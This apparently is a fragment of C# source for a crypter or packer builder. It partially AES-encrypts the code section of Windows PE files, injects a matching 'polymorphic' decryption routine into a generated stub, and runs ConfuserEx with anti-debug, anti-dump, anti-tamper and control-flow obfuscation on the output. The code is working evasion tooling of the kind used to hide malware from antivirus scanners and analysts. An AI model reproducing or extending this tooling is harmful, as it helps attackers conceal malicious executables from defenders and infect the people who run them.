                // Verify PE signature
                if (data[peHeaderOffset] != 'P' || data[peHeaderOffset + 1] != 'E' || 
                    data[peHeaderOffset + 2] != 0 || data[peHeaderOffset + 3] != 0)
                    return data; // Not a valid PE file, return original data
                    
                // Get the size of optional header to determine where sections start
                int optionalHeaderSize = BitConverter.ToInt16(data, peHeaderOffset + 20);
                
                // Calculate where the first section starts
                int firstSectionOffset = peHeaderOffset + 24 + optionalHeaderSize;
                
                // Ensure we have enough space for at least one section
                if (firstSectionOffset + 40 > data.Length)
                    return data; // Not enough space, return original data
                    
                // Get the number of sections
                int numberOfSections = BitConverter.ToInt16(data, peHeaderOffset + 6);
                
                if (numberOfSections <= 0)
                    return data; // No sections, return original data
                    
                // Find the first code section
                int codeSection = -1;
                for (int i = 0; i < numberOfSections; i++)
                {
                    int sectionOffset = firstSectionOffset + (i * 40);
                    
                    // Skip if section header is out of bounds
                    if (sectionOffset + 40 > data.Length)
                        continue;
                        
                    // Check if this is a code section (has code characteristics)
                    uint characteristics = BitConverter.ToUInt32(data, sectionOffset + 36);
                    if ((characteristics & 0x20) != 0) // IMAGE_SCN_CNT_CODE
                    {
                        codeSection = i;
                        break;
                    }
                }
                
                // If no code section found, use first section
                if (codeSection == -1)
                    codeSection = 0;
                    
                // Get the virtual address and size of the code section
                int codeSectionOffset = firstSectionOffset + (codeSection * 40);
                int rawDataOffset = BitConverter.ToInt32(data, codeSectionOffset + 20);
                int rawDataSize = BitConverter.ToInt32(data, codeSectionOffset + 16);
                
                // Validate section data
                if (rawDataOffset < 0 || rawDataOffset >= data.Length || 
                    rawDataSize <= 0 || rawDataOffset + rawDataSize > data.Length)
                    return data; // Invalid section data, return original data
                    
                // Only encrypt a small portion inside the code section (not the beginning)
                // to avoid breaking executable structure
                int startOffset = rawDataOffset + 256; // 256 bytes into code section
                int lengthToEncrypt = Math.Min(256, data.Length - startOffset); // Small section to encrypt
                
                if (lengthToEncrypt <= 0 || startOffset + lengthToEncrypt > data.Length)
                    return data; // Invalid encryption bounds, return original data
                
                // Extract the portion to encrypt
                byte[] portionToEncrypt = new byte[lengthToEncrypt];
                Array.Copy(data, startOffset, portionToEncrypt, 0, lengthToEncrypt);
                
                // Encrypt using AES
                using (Aes aes = Aes.Create())
                {
                    aes.Key = key;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    
                    using (ICryptoTransform encryptor = aes.CreateEncryptor())
                    {
                        byte[] encrypted = encryptor.TransformFinalBlock(portionToEncrypt, 0, portionToEncrypt.Length);
                        
                        // Copy encrypted portion back into result
                        // Note: encrypted might be longer due to padding, so only copy what fits
                        int copyLength = Math.Min(encrypted.Length, lengthToEncrypt);
                        Array.Copy(encrypted, 0, result, startOffset, copyLength);
                    }
                }
            }
            catch 
            {
                // On any error, return the original data
                return data;
            }
            
            return result;
        }
        
        // Add AES functions to the stub template
        private string AddPolymorphicAesFunctionsToStub(string stub)
        {
            string aesFunctions = @"
        // Remove the polymorphic AES layer from the encrypted data
        private static byte[] RemovePolymorphicAesLayer(byte[] data, byte[] key, byte[] iv)
        {
            byte[] result = (byte[])data.Clone();
            
            try
            {
                // First verify this is a PE file by checking the DOS header signature ""MZ""
                if (data.Length < 2 || data[0] != 0x4D || data[1] != 0x5A)
                    return data; // Not a valid PE file, return original data

                // Get PE header offset from the DOS header
                int peHeaderOffset = -1;
                if (data.Length >= 64)
                {
                    peHeaderOffset = BitConverter.ToInt32(data, 60);
                }
                
                // Validate PE header offset
                if (peHeaderOffset < 0 || peHeaderOffset > data.Length - 4)
                    return data; // Invalid PE header, return original data
                    
                // Verify PE signature
                if (data[peHeaderOffset] != 'P' || data[peHeaderOffset + 1] != 'E' || 
                    data[peHeaderOffset + 2] != 0 || data[peHeaderOffset + 3] != 0)
                    return data; // Not a valid PE file, return original data
                    
                // Get the size of optional header to determine where sections start
                int optionalHeaderSize = BitConverter.ToInt16(data, peHeaderOffset + 20);
                
                // Calculate where the first section starts
                int firstSectionOffset = peHeaderOffset + 24 + optionalHeaderSize;
                
                // Ensure we have enough space for at least one section
                if (firstSectionOffset + 40 > data.Length)
                    return data; // Not enough space, return original data
                    
                // Get the number of sections
                int numberOfSections = BitConverter.ToInt16(data, peHeaderOffset + 6);
                
                if (numberOfSections <= 0)
                    return data; // No sections, return original data
                    
                // Find the first code section
                int codeSection = -1;
                for (int i = 0; i < numberOfSections; i++)
                {
                    int sectionOffset = firstSectionOffset + (i * 40);
                    
                    // Skip if section header is out of bounds
                    if (sectionOffset + 40 > data.Length)
                        continue;
                        
                    // Check if this is a code section (has code characteristics)
                    uint characteristics = BitConverter.ToUInt32(data, sectionOffset + 36);
                    if ((characteristics & 0x20) != 0) // IMAGE_SCN_CNT_CODE
                    {
                        codeSection = i;
                        break;
                    }
                }
                
                // If no code section found, use first section
                if (codeSection == -1)
                    codeSection = 0;
                    
                // Get the virtual address and size of the code section
                int codeSectionOffset = firstSectionOffset + (codeSection * 40);
                int rawDataOffset = BitConverter.ToInt32(data, codeSectionOffset + 20);
                int rawDataSize = BitConverter.ToInt32(data, codeSectionOffset + 16);
                
                // Validate section data
                if (rawDataOffset < 0 || rawDataOffset >= data.Length || 
                    rawDataSize <= 0 || rawDataOffset + rawDataSize > data.Length)
                    return data; // Invalid section data, return original data
                    
                // Decrypt the same small portion inside the code section
                int startOffset = rawDataOffset + 256; // 256 bytes into code section
                int lengthToDecrypt = Math.Min(256, data.Length - startOffset);
                
                if (lengthToDecrypt <= 0 || startOffset + lengthToDecrypt > data.Length)
                    return data; // Invalid decryption bounds, return original data
                
                // Extract the portion to decrypt
                byte[] portionToDecrypt = new byte[lengthToDecrypt];
                Array.Copy(data, startOffset, portionToDecrypt, 0, lengthToDecrypt);
                
                // Decrypt using AES
                using (Aes aes = Aes.Create())
                {
                    aes.Key = key;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    
                    using (ICryptoTransform decryptor = aes.CreateDecryptor())
                    {
                        try
                        {
                            byte[] decrypted = decryptor.TransformFinalBlock(portionToDecrypt, 0, portionToDecrypt.Length);
                            
                            // Copy decrypted portion back into result
                            int copyLength = Math.Min(decrypted.Length, lengthToDecrypt);
                            Array.Copy(decrypted, 0, result, startOffset, copyLength);
                        }
                        catch
                        {
                            // If decryption fails, return the original data
                            return data;
                        }
                    }
                }
            }
            catch
            {
                // On any error, return the original data
                return data;
            }
            
            return result;
        }";
            
            // Insert before the SimpleXorDecrypt function
            int index = stub.IndexOf("private static byte[] SimpleXorDecrypt");
            if (index != -1)
            {
                return stub.Insert(index, aesFunctions);
            }
            
            return stub;
        }

        // Add a method to apply Armdot obfuscation
        private string ApplyArmdotObfuscation(string filePath, string outputPath)
        {
            // Create a timestamped filename to avoid file locking issues
            string timestamp = DateTime.Now.ToString("yyyyMMddHHmmss");
            
            // Create a separate temp directory just for Armdot processing
            string armdotTempDir = Path.Combine(Path.GetTempPath(), "armdot_" + timestamp);
            Directory.CreateDirectory(armdotTempDir);
            
            string outputFileName = Path.GetFileNameWithoutExtension(filePath) + "_" + timestamp + Path.GetExtension(filePath);
            string outputFilePath = Path.Combine(armdotTempDir, outputFileName);
            
            // Copy the file to a new temporary location to avoid locking issues
            File.Copy(filePath, outputFilePath, true);
            
            // Path to Armdot Protector CLI
            string armdotPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "packages", "ConfuserEx.Final.1.0.0", "tools", "Confuser.CLI.exe");
            
            if (!File.Exists(armdotPath))
            {
                // Try alternative path
                armdotPath = Path.Combine(Directory.GetCurrentDirectory(), "packages", "ConfuserEx.Final.1.0.0", "tools", "Confuser.CLI.exe");
                
                if (!File.Exists(armdotPath))
                {
                    throw new FileNotFoundException("Armdot/ConfuserEx CLI not found at: " + armdotPath);
                }
            }
            
            // Create a temporary configuration file for Armdot
            string configPath = Path.Combine(armdotTempDir, "armdot_config_" + timestamp + ".crproj");
            string configContent = $@"
<project baseDir=""{armdotTempDir}"" outputDir=""{armdotTempDir}"" xmlns=""http://confuser.codeplex.com"">
  <module path=""{outputFileName}"">
    <rule pattern=""true"" preset=""maximum"" inherit=""false"">
      <protection id=""anti debug"" />
      <protection id=""anti dump"" />
      <protection id=""anti ildasm"" />
      <protection id=""anti tamper"" />
      <protection id=""constants"" />
      <protection id=""ctrl flow"" />
      <protection id=""invalid metadata"" />
      <protection id=""ref proxy"" />
      <protection id=""rename"" />
      <protection id=""resources"" />
    </rule>
  </module>
</project>";
            
            File.WriteAllText(configPath, configContent);
            
            string resultPath = outputPath; // Default to the input path
            
            try
            {
                // Ensure the output file is not running
                try
                {
                    foreach (var process in System.Diagnostics.Process.GetProcessesByName(Path.GetFileNameWithoutExtension(filePath)))
                    {
                        try { process.Kill(); process.WaitForExit(1000); } catch { }
                    }
                    
                    // Force GC to release file handles
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                }
                catch { /* Ignore errors */ }
                
                // Run the Armdot/ConfuserEx CLI with new output file name
                using (var process = new System.Diagnostics.Process())
                {
                    process.StartInfo.FileName = armdotPath;
                    process.StartInfo.Arguments = "\"" + configPath + "\"";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                    
                    process.Start();
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    
                    if (process.ExitCode != 0)
                    {
                        throw new Exception("Armdot obfuscation failed with exit code: " + process.ExitCode + 
                                            "\nOutput: " + output + 
                                            "\nError: " + error);
                    }
                    
                    // After successful obfuscation, copy the obfuscated file to the original output path
                    try
                    {
                        File.Copy(outputFilePath, outputPath, true);
                    }
                    catch
                    {
                        // If we can't copy back to original path, update the reference to point to our temp file
                        resultPath = outputFilePath;
                    }
                }
            }
            finally
            {
                try
                {
                    // Wait a bit to ensure files are released
                    System.Threading.Thread.Sleep(500);
                    
                    // Clean up temporary files but don't delete the output if it's our result
                    if (File.Exists(configPath))
                        File.Delete(configPath);
                        
                    // Only try to delete the temp directory if we successfully copied the file back
                    if (resultPath != outputFilePath)
                    {
                        try
                        {
                            // Try to clean up the temporary directory
                            if (Directory.Exists(armdotTempDir))
                                Directory.Delete(armdotTempDir, true);
                        }
                        catch { /* Ignore cleanup errors */ }
                    }
                }
                catch { /* Ignore cleanup errors */ }
            }
            
            return resultPath;
        }
    }
}
